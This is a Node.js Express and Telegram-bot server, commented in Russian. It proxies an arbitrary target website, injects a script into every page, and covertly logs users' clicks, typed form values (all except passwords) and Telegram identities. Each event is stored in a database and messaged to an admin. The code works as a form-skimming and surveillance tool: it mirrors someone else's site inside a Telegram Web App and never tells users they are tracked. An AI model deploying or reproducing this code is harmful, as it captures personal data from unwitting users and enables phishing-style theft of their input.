require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

const app = express();
app.use(express.json());

// Database
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// Telegram Bot
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const TARGET_SITE = process.env.TARGET_SITE || 'https://example.com';

// Инициализация БД
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS logs (
      id SERIAL PRIMARY KEY,
      session_id VARCHAR(255),
      telegram_user JSONB,
      event_type VARCHAR(50),
      element VARCHAR(255),
      value TEXT,
      page_url TEXT,
      created_at TIMESTAMP DEFAULT NOW()
    )
  `);
}
initDB();

// Трекер скрипт (встраивается автоматически)
const trackerScript = `
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
(function() {
  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); }
  const telegramUser = tg?.initDataUnsafe?.user || null;
  const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
  
  function sendLog(eventType, element, value) {
    fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, telegramUser, eventType, element, value: value || '', pageUrl: location.href })
    }).catch(() => {});
  }
  
  sendLog('pageview', document.title || location.pathname);
  
  document.addEventListener('click', (e) => {
    const el = e.target;
    const tag = el.tagName.toLowerCase();
    const text = el.innerText?.slice(0, 50) || '';
    const id = el.id ? '#' + el.id : '';
    const cls = el.className && typeof el.className === 'string' ? '.' + el.className.split(' ')[0] : '';
    sendLog('click', tag + id + cls, text);
  });
  
  document.addEventListener('change', (e) => {
    const el = e.target;
    if (['INPUT','TEXTAREA','SELECT'].includes(el.tagName)) {
      const name = el.name || el.id || el.placeholder || 'field';
      const val = el.type === 'password' ? '***' : el.value;
      sendLog('input', name, val);
    }
  });
  
  document.addEventListener('submit', (e) => {
    sendLog('submit', e.target.name || e.target.id || 'form');
  });
  
  console.log('[Tracker] Ready, session:', sessionId);
})();
</script>
`;

// Прокси — загружает сайт и внедряет трекер
app.get('/', async (req, res) => {
  try {
    const response = await fetch(TARGET_SITE);
    let html = await response.text();
    
    // Внедряем трекер перед </body>
    if (html.includes('</body>')) {
      html = html.replace('</body>', trackerScript + '</body>');
    } else {
      html += trackerScript;
    }
    
    res.send(html);
  } catch (err) {
    console.error('Proxy error:', err);
    res.status(500).send('Ошибка загрузки сайта');
  }
});

// Прокси для остальных страниц
app.get('/page/*', async (req, res) => {
  try {
    const path = req.params[0];
    const response = await fetch(TARGET_SITE + '/' + path);
    let html = await response.text();
    
    if (html.includes('</body>')) {
      html = html.replace('</body>', trackerScript + '</body>');
    } else {
      html += trackerScript;
    }
    
    res.send(html);
  } catch (err) {
    res.status(500).send('Ошибка загрузки');
  }
});

// API логирования
app.post('/api/log', async (req, res) => {
  const { sessionId, telegramUser, eventType, element, value, pageUrl } = req.body;
  
  try {
    await pool.query(
      'INSERT INTO logs (session_id, telegram_user, event_type, element, value, page_url) VALUES ($1, $2, $3, $4, $5, $6)',
      [sessionId, JSON.stringify(telegramUser), eventType, element, value, pageUrl]
    );
    
    const icons = { click: '👆', input: '⌨️', submit: '📤', pageview: '👁️' };
    const icon = icons[eventType] || '📝';
    const user = telegramUser?.username ? '@' + telegramUser.username : telegramUser?.id || 'Аноним';
    
    let msg = icon + ' ' + eventType.toUpperCase() + '\n';
    msg += '👤 ' + user + '\n';
    msg += '🎯 ' + element + '\n';
    if (value) msg += '📝 ' + value + '\n';
    msg += '🔗 ' + pageUrl;
    
    await bot.sendMessage(ADMIN_ID, msg);
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Error' });
  }
});

// Команды бота
bot.onText(/\/start/, (msg) => {
  const webappUrl = process.env.WEBAPP_URL || 'https://your-app.railway.app';
  bot.sendMessage(msg.chat.id, '👋 Открой приложение:', {
    reply_markup: {
      inline_keyboard: [[{ text: '🚀 Открыть', web_app: { url: webappUrl } }]]
    }
  });
});

bot.onText(/\/logs/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  const result = await pool.query('SELECT * FROM logs ORDER BY created_at DESC LIMIT 10');
  if (!result.rows.length) return bot.sendMessage(msg.chat.id, 'Логов нет');
  let text = '📊 Последние события:\n\n';
  result.rows.forEach((l, i) => { text += (i+1) + '. ' + l.event_type + ' — ' + l.element + '\n'; });
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/clear/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  await pool.query('DELETE FROM logs');
  bot.sendMessage(msg.chat.id, '🗑️ Очищено');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server on port ' + PORT));
